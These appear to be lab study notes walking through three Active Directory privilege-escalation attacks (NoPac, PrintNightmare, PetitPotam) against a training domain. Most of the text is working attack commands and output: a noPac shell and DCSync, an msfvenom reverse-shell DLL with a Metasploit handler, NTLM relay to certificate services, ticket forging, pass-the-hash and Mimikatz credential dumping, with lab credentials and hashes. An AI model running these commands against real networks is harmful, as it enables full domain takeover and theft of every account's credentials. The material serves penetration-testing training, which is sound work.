## NoPac (SamAccountName Spoofing)
This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
We can use this [tool](https://github.com/Ridter/noPac) (noPac) to perform this attack.
We can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`.

#### Scanning for NoPac
```shell
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

#### Running NoPac & Getting a Shell
```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
 Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.
It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.
#### Confirming the Location of Saved Tickets
```shell
> ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py  requirements.txt utils
README.md  scanner.py
```
We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account
```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

---
## PrintNightmare
`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.

**!! USE OUTSIDE EXEGOL WITH cube0x0 impacket version** For this exploit to work successfully, we will need to use cube0x0's version of Impacket.

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
#### Enumerating for MS-RPRN
```shell
> rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.
#### Generating a DLL Payload
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.
#### Creating a Share with smbserver.py
```shell-session
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
#### Configuring & Starting MSF multi/handler
```shell
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```
#### Running the Exploit
```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

#### Getting the SYSTEM Shell
```Metasploit
C:\Windows\system32>whoami
whoami
nt authority\system
```

---
## PetitPotam (MS-EFSRPC)
PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31).

This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.

 First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.
#### Starting ntlmrelayx.py
```shell
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

#### Running PetitPotam.py
```shell
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

#### Catching Base64 Encoded Certificate for DC01
On our ntlmrelayx:

```shell
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
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
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

#### Requesting a TGT Using gettgtpkinit.py
Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

#### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```shell
export KRB5CCNAME=dc01.ccache
```

#### Using Domain Controller TGT to DCSync
We can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file

#### Running klist
```shell
> klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

#### Confirming Admin Access to the Domain Controller (PtH)
```shell
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```


#### Submitting a TGS Request for Ourselves Using getnthash.py
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user.

This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier with gettgtpkinit.py.

```shell
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```


#### Using Domain Controller NTLM Hash to DCSync
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

Note: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

#### Requesting TGT and Performing PTT with DC01$ Machine Account
```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

We can then type `klist` to confirm that the ticket is in memory.
#### Confirming the Ticket is in Memory
```powershell-session
PS C:\Tools> klist

#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.

#### Performing DCSync with Mimikatz
```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe


mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```


